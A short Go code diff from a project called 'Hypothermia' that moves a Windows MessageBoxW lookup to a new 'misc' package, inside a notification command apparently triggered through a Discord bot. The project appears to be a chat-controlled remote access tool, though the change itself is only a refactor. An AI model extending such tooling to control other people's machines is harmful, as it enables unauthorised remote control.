@@ -5,7 +5,9 @@ import (
 	"syscall"
 	"unsafe"
 
+	"Hypothermia/src/misc"
 	"Hypothermia/src/utils"
+
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -17,7 +19,7 @@ const (
 	notifConvertError string = "🟥 Failed to convert argument."
 )
 
-var msgBox *syscall.LazyProc = utils.User32.NewProc("MessageBoxW")
+var msgBox *syscall.LazyProc = misc.User32.NewProc("MessageBoxW")
 
 func (*NotifCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	if len(args) < 2 {
